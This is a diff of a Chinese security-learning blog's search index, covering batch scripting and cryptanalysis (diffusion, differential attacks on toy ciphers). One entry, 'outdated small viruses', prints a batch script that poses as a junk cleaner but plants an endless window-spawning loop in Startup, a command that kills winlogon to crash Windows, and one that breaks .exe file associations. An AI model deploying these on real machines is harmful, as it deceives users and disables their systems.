class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
+<p>ntsd    ：杀死进程</p>
+<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
+<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
+<ul>
+<li>修改文件关联，使无法打开（前一章写过）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安学习-D-4-用户，组管理</title>
     <url>/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>每个用户有自己唯一的 SID（安全标识符），window 系统，通过命令 ：<code>wmic useraccount get name,sid</code> 查看</p>
@@ -453,80 +535,6 @@ or\\
       </categories>
       <tags>
         <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
-    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
-    <content><![CDATA[<p>环境：win2003 虚拟机</p>
-<p>只做简单了解，并不深究…</p>
-<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
-<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
-<p><strong>发布博客的批处理文件</strong></p>
-<p>我自己的：</p>
-<ol>
-<li>push</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-<ol>
-<li>check</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
-<p>3.NewBlog</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
-<p><strong>一个小例子</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
-<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
-<p>如：</p>
-<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
-<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
-<p>参考：</p>
-<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
-<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
-<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
-<ul>
-<li>添加 开机自启动项，无限弹窗</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
-<p>ntsd    ：杀死进程</p>
-<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
-<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
-<ul>
-<li>修改文件关联，使无法打开（前一章写过）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CS</category>
-      </categories>
-      <tags>
-        <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Diffusion Basic</title>
-    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
-    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
-<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
-<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
-<p>在研究扩散性时，如果往其最基本单元考虑：</p>
-<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
-<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
-<blockquote>
-<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
-</blockquote>
-<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
-<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
-]]></content>
-      <tags>
-        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -655,6 +663,25 @@ D_n = \max (N,\lceil(R \cdot \ell-N \cdot s) / n\rceil)</script>]]></content>
       </tags>
   </entry>
   <entry>
+    <title>Diffusion Basic</title>
+    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
+    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
+<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
+<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
+<p>在研究扩散性时，如果往其最基本单元考虑：</p>
+<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
+<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
+<blockquote>
+<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
+</blockquote>
+<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
+<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
+]]></content>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PRF and PRP</title>
     <url>/2022/07/06/Cryptanalysis/PRF%20and%20PRP/</url>
     <content><![CDATA[<h1 id="伪随机函数-PRF-和-伪随机置换-PRP"><a href="#伪随机函数-PRF-和-伪随机置换-PRP" class="headerlink" title="伪随机函数 PRF 和 伪随机置换 PRP"></a>伪随机函数 PRF 和 伪随机置换 PRP</h1><h2 id="PRF-pseudorandom-function"><a href="#PRF-pseudorandom-function" class="headerlink" title="PRF (pseudorandom function)"></a>PRF (pseudorandom function)</h2><p><strong>1. 场景：</strong></p>
@@ -745,6 +772,239 @@ P_r(X_1 \oplus X_2 \oplus...\oplus X_n=0)=\frac{1}{2} + 2^{n-1}\prod_{i=1}^{n}\v
       </categories>
       <tags>
         <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Differential Cryptanalysis</title>
+    <url>/2022/05/25/Cryptanalysis/%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p><em>有些地方没渲染出来，以后注意</em></p>
+<h1 id="Differential-Cryptanalysis"><a href="#Differential-Cryptanalysis" class="headerlink" title="Differential Cryptanalysis"></a>Differential Cryptanalysis</h1><h3 id="DC-to-ToyCipher"><a href="#DC-to-ToyCipher" class="headerlink" title="DC to ToyCipher"></a>DC to ToyCipher</h3><center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650188144391/B9FB9D37BDF15A699BC071CE49BAEA53" width="30%">
+</center>
+
+<h4 id="CIPHER-1"><a href="#CIPHER-1" class="headerlink" title="CIPHER-1"></a>CIPHER-1</h4><p>以一个$toycipher$为例：$CIPHER-1$，其中，$S[·]$ 表示一个公开的 $S-Box$ 置换（可逆)</p>
+  <center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189319128/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+  </center>
+
+<p>在已知明文 $m_{0} \; m_{1}$ ，密文 $c_{0}\;c_{1}$ 的情况下（已知明文攻击），加密过程如下：</p>
+<p>(已知：$m_{0} \; m_{1}\; c_{0}\;c_{1} ;$<br>未知：$k_{0}\;k_{1}\;u\;v)$</p>
+<center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186751354/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
+  </center>
+
+<p>由于两次加密使用的是相同的密钥 $k_{0}$和 $k_{1}$ ，所以对明文以密码最常用操作( $\bigoplus$ )做差分得到：</p>
+  <center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650186863109/D2B5CA33BD970F64A6301FA75AE2EB22" width="60%">
+  </center>
+
+<p>即，明文$m_{0} \; m_{1}$差分 == 中间状态 $u_{0}, u_{1}$ 的差分，消去了密钥 $k_{0}$ 的影响；</p>
+<p>所以，跳过 $k_{0}$ 的影响，枚举 $k_{1}$ 的候选值，记 $t$，当$ t$ 满足 </p>
+<script type="math/tex; mode=display">
+\textcolor{red}{S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}}</script><p>时，记 $1$ 次有效的 $t$ 计数，当 $t$ 计数足够多时，则认为 $t$ 有很大可能就是$k_{1}$ ，只需验证即可。</p>
+<p>$ Conclusion\underline{ }\;P_1: $</p>
+<ol>
+<li>即使中间数据未知，仍然可以通过寻找已知数据的差异来断定中间数据的差异；</li>
+<li>差分分析的一种方法(init) ，通过寻找确定的一部分中间状态数据，穷举另一部分未知数据来恢复密钥。</li>
+</ol>
+<p>下面是一个具体的分析的例子:</p>
+  <center>
+ <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189084066/D2B5CA33BD970F64A6301FA75AE2EB22">
+  </center>
+
+  <center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650189139457/D2B5CA33BD970F64A6301FA75AE2EB22">
+  </center>
+
+
+<p>简单解释一下以上例子的过程：（已知明文攻击）</p>
+<ol>
+<li><p>选择两对明密文，根据上面推出的公式：中间值差分$(u_{0}\bigoplus u_1)==$ 明文差分 $(m_{0} \bigoplus m_{1})$，计算出$u_{0} \bigoplus u_{1}$的值;</p>
+</li>
+<li><p>计算出$S[·]$的逆$S^{-1}[·]=R[·]$，用来计算核心推导式;</p>
+</li>
+<li><p>穷举所有的 $k_{1}= t$,根据式：$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}]$计算出中间值差分;</p>
+</li>
+<li><p>将3.中的结果与2.中的结果匹配，对可能使等式$S^{-1}  [ t \bigoplus c_{0}] \bigoplus S^{-1} [ t \bigoplus c_{0}] == m_{0} \bigoplus m_{1}$成立的t计数（或存到一个集合中）需要注意使成立的t值可能<font color = purple>不唯一</font>，这就涉及到差分概率，后面再说;</p>
+</li>
+<li><p>为了找出唯一的$t=k_{1}$，需要更多的明密文对来重复上述1.2.3.4.过程;</p>
+</li>
+<li><p>将多个明密文对产生的可能$t=k_{1}$结果取交集，直到得到最后的唯一的结果，即可以断定其为正确的$k_{1}$</p>
+</li>
+</ol>
+  <center>
+<br>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203196847/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+  <br>
+  </center>
+
+<h4 id="CIPHER-2"><a href="#CIPHER-2" class="headerlink" title="CIPHER-2"></a>CIPHER-2</h4><p>下面考虑一个更复杂的例子，假设$Cipher-2$有两个$S$盒及$3$个密钥：</p>
+<center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650203999365/757C75C2BC7E2D8D9493B7FD3FD6BF1F" width="80%">
+</center>
+
+<p>明显，在以上例子中，虽然有关系 $m_{0} \bigoplus m_{1}$，但无法通过$S[·]$的逆找到中间值$w$和$v$，因为再往前传递数据的过程中，$S[·]$会消去已部分差分关系（当然，不是完全消去）</p>
+<p>那么，就需要更进一步的考虑$S$盒对该差分传递的影响</p>
+<p>下面做一个小测试，考虑两个相同$S$盒的输出差分:<br>取i,j分别为进入两个S盒的数据，且i是j的补，即$j=i \bigoplus f$，则有下表$<br></p>
+<blockquote>
+<p><strong>#小知识：二进制数据$i$的补$==i\bigoplus F_{16} ==i\bigoplus \vec{1}$</strong></p>
+</blockquote>
+<p>按照$CIPHER-1$的办法无法获取中间值$v$和$w$，因为经过了非线性的$S$盒，$\bigoplus $的差分无法被传递下去；<br>所以选定明文 $i$，和通过明文 $i$ 可以推出的明文 $j$ ，并将其分别进入 $S$ 盒，拿到其输出 $S$ 盒的差分，建立下表：</p>
+<center>
+  <img src="https://uploadfiles.nowcoder.com/images/20220417/629760107_1650205129825/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center>
+
+
+<p>通过上面发现，在第五列，$d$ 出现的频率更高   ，下面给出以上由 $i$ 到 $j$ 到 $S[i] \bigoplus S[j]$ 的推导过程：</p>
+<script type="math/tex; mode=display">
+i(i.e. message\;or\;plaintext) \rightarrow i \bigoplus F = S[i] \bigoplus S[j]</script><p>所以，我们只需要有一个明文 $i$ 即可；</p>
+<p>根据对 $CIPHER-1$ 的攻击可以知道，$m_{0}\bigoplus m_{1} == u_{0} \bigoplus u_{1} == F$,所以有：*当两个异或等于 $ F $ 的值分别进入该 $ S $ 盒，会有$ \frac{10}{16} $的概率得到输出差分 $ d$ ；</p>
+<p>同时，通过猜测$ k_{2} $可以得到 $w$ 位置的差分，而 $w$ 位置的差分又等于 $v$ 位置的差分。</p>
+<p><strong>所以得到结论：</strong></p>
+<p>通过选择两个输入差分为 F 的明文产生密文（并不是选择明文攻击），猜测 $k_{2}$ 从反向在中间进行对比，如果差分数据十分随机，则猜测的 $k_{2}$ 不对，如果猜测 $k_{2}$ 使得在中间 $v_{0}\bigoplus v_{1}$ 为 $d$，则很大可能猜测的 $k_{2}$ 正确。</p>
+<p>那么更进一步，对任何一对”选择”的明密文，猜测 $k_{2}$ ，并将所有 $k_{2}$ 的猜测记在$hash$表中，如果 $k_{2}$ 使得中间的差分 $ v_{0}\bigoplus v_{1} = $差分分布表中频率出现最高的数据（如 $Table\;6.1$ 的 $d$），则将该$hash$表中对于的 $k_{2}$ 的位置计数 $+1$.(*逆向推 $k_{2}$ 的过程中，正确的 $k_{2}$ 将会使中间值差分出现的频率远高于其他值出现的频率，如上图 $v_{0} \bigoplus v_{1}=d$ 概率为 $ \frac{10}{16} $,而其他为$ \frac{1}{16} $.</p>
+<p>以上的寻找输入差分 $d_{in}$ 及其经过两个 $S-Box$ 之后的输出差分 $d_{out}$ 的值可以建一个差分表 $\textcolor{red}{DDT}$  ,如下：</p>
+<p>从下图可以看出，当输入差分为$f$时，输出差分为$d$出现的频率最高次数为10，所以选择差分 $f$ 从 $plaintext$ 注入，获得一条差分概率最大的路径，概率为$\frac{10}{16}$,路径为$f\rightarrow d$. </p>
+<p><img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650360923811/D2B5CA33BD970F64A6301FA75AE2EB22" alt="img"></p>
+<p>对 $CIPHER-2$ 的分析让我们发现了 $S[·]$ 的一些规律，比如：</p>
+<ul>
+<li>如果两对差分输入位上均不同，如 $0001\;and\;1110$，观察上表的 $1\;and\;e$ ，输出差分在各位也均不同；</li>
+<li>在所有位位置不同的十对输入将产生除了第二个最低有效位位置之外的所有不同的输出对；</li>
+<li>$and\;so\;on\;and\;so\;forth$</li>
+</ul>
+<p>那么，如果一对输入输出差分$(\alpha,\beta)$，即输入差分 $\alpha$ 通过 $S[·]$ 可以得到输出差分 $\beta$ ,则称该过程为通过操作 $S[·]$ 的差分特征 $ (differential) \;characteristic\;across\;the\;operation\;S[⋅]$ 记作$\alpha\;\stackrel{S[·]}{\rightarrow}\;\beta$ ,一个特征成立就有与其对应的概率如 $f\;\stackrel{S[·]}{\rightarrow}\;b$ 的概率为$\frac{10}{16}$.</p>
+<h3 id="DC-using-Characteristic"><a href="#DC-using-Characteristic" class="headerlink" title="DC using Characteristic"></a>DC using Characteristic</h3><h4 id="CIPHER-3"><a href="#CIPHER-3" class="headerlink" title="CIPHER-3"></a>CIPHER-3</h4><p>有了上面的规律，可以考虑一个更加复杂的$ToyCipher$：$CIPGERTHREE$在$CIPHER-2$的基础上，又多加了一个$S[·]$及一个密钥$k_3$</p>
+<center>
+<img src="https://uploadfiles.nowcoder.com/images/20220418/629760107_1650291467544/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center>
+
+<p>有了对$CIPHER-2$的分析方法，对$CIPHER-3$分析就容易理解多了：如果考虑通过一个$S[·]$，则给定差分 $f$ 会得到差分 $d$ 的概率时 $\frac{10}{16}$；那么，考虑差分继续往后传播，到第二个$S[·]$，通过查表 $Table 6.2$ 可以得知，概率最高的是特征 $d\;\stackrel{S[·]}{\rightarrow}\;c$，概率为 $\frac{6}{16}$，也就是说，如果我们希望能够通过”猜密钥”的方式（或者是枚举）得到密钥 $k_3$ ，就需要经过两个 $S[·]$ ，而带来的影响是，差分概率降低（<em>我们选取的是差分概率最高的一条特征路径）。很自然的，我们把通过两个$S[·]$的差分特征概率乘起来 $\frac{10}{16}  </em> \frac{6}{16}=\frac{15}{64}$，也就是说，我们猜出正确的$k_3$的概率是$\frac{15}{64}$,但这也是很大的降低了噪声对我们猜测密钥的影响，因为随机猜测密钥的。</p>
+<h4 id="CIPHER-4"><a href="#CIPHER-4" class="headerlink" title="CIPHER-4"></a>CIPHER-4</h4><p>$CIPHER-4$已经十分类似我们现在使用的分组密码（见 $AES$ 算法 $Rijndael$）：使用 $r$ 轮加密，对 $16-bit\;block$ 操作，所有的 $r+1$ 轮的密钥都随机均匀选取，每一轮包含结构 $S[·]\;and\;P[·]$ （都可逆）见下图：</p>
+<p><em>其中，每一轮的输入为 $16-bit$ ，被分为 $4 </em> 4-bit$ 的四个半字节放入 $4 <em> S[·]$ 和 $P[·]$ 中运算，也就是说 $S[·]\;and\;P[·]$ 都是在 $\{0,1\}^4\;\rightarrow(0,f)$ 上的置换</em></p>
+<p>4 轮的 $CIPHER-4$ 实现了充分的扩散（雪崩），这得益于$P[·]$的设计；</p>
+<p>除 $S[·]$ 外，其余运算对二进制上的加法 $\bigoplus$ 均是线性的，$P[·]$ 运算可以用一个线性的矩阵表示；</p>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357183268/D2B5CA33BD970F64A6301FA75AE2EB22" width = "80%">
+</center>
+<center>
+    <img src="https://uploadfiles.nowcoder.com/images/20220419/629760107_1650357308008/D2B5CA33BD970F64A6301FA75AE2EB22" width="80%">
+</center>
+
+<p>下面，考虑对$CIPHER-4$分析，继承对$CIPHER-3$的分析方法，寻找前 $r-1$ 轮的差分特征，猜第 $r$ 轮使用的密钥 $k_r$，由于有 4 个 $S[·]$ 所以将差分特征表示为：</p>
+<script type="math/tex; mode=display">
+(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{S}{\rightarrow}(\beta_1,\beta_2,\beta_3,\beta_4)</script><p>还有一个 $P[·]$ 作用在 $S[·]$ 之后，而 $P[·]$ 不会影响差分值，只会影响其在下一轮出现的位置， $P[·]$的作用是将差分传播到尽可能多的  $S[·]$ 中，将 $P[·]$过程表示为：</p>
+<script type="math/tex; mode=display">
+(\beta_1,\beta_2,\beta_3,\beta_4)\stackrel{P}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>所以，$\beta_1||\beta_2||\beta_3||\beta_4$ 就表示输入差分经 $S[·]$ 之后的输出差分，$\gamma_1||\gamma_2||\gamma_3||\gamma_4$ 表示输出差分经 $P[·]$之后该轮最后的输出差分，所以一轮的差分总体表示为：</p>
+<script type="math/tex; mode=display">
+(\alpha_1,\alpha_2,\alpha_3,\alpha_4)\stackrel{\mathcal{R}}{\rightarrow}(\gamma_1,\gamma_2,\gamma_3,\gamma_4)</script><p>通过表$Table\;6.2$ 可以发现，如果输入 $S[·]$ 的差分为 0，则输出差分也为 0 ，所以对于 $16-bit\;block$，可以以没半个字节为单位，构造只在一位（一个 $S[·]$ 输入差分）为非零值的数据。当然，这在分析上是允许的，但变成了*选择明文攻击，因为明文是我们自己构造的。在考虑$S[·]$的活跃性时，相当于构造只有一个$S[·]$活跃的轮。构造的输入差分例如$(0,0,1,0)$，每一个位置进入一个$S[·]$，那么至少在第一轮只有一个$S[·]$的输出会存在差分。</p>
+<p>再考虑到前面对$CIPHER-1,CIPHER-2$分析的时候，得到一个$S[·]$ 存在最大的差分特征 $f\;\stackrel{S[·]}{\rightarrow}\;b$ ，概率为$\frac{10}{16}$，所以将输入差分令为$(0,0,0,f)$，那么对第一轮，就只有第四个$S[·]$ 存在差分，描述经过一轮差分的传递：</p>
+<script type="math/tex; mode=display">
